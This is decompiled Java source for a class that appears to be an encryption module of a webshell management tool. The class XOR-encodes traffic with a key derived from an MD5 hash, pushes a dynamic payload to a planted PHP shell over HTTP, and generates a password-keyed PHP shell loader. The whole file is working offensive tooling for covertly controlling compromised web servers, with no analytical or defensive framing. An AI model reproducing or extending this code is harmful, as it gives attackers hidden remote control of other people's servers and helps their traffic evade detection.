/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import shells.cryptions.phpXor.Generate;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name="PHP_XOR_RAW", payloadName="PhpDynamicPayload")
public class PhpXorRaw
implements Cryption {
    private ShellEntity shell;
    private Http http;
    private byte[] key;
    private boolean state;
    private byte[] payload;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        try {
            this.shell.getHeaders().put("Content-Type", "application/octet-stream");
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
            return;
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(data);
            } catch (Exception e) {
                Log.error(e);
                return null;
            }
        }
        return data;
    }

    @Override
    public boolean isSendRLData() {
        return false;
    }

    public byte[] E(byte[] cs) {
        int len = cs.length;
        for (int i = 0; i < len; ++i) {
            cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
        }
        return cs;
    }

    public byte[] D(byte[] cs) {
        int len = cs.length;
        for (int i = 0; i < len; ++i) {
            cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
        }
        return cs;
    }

    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
    }
}

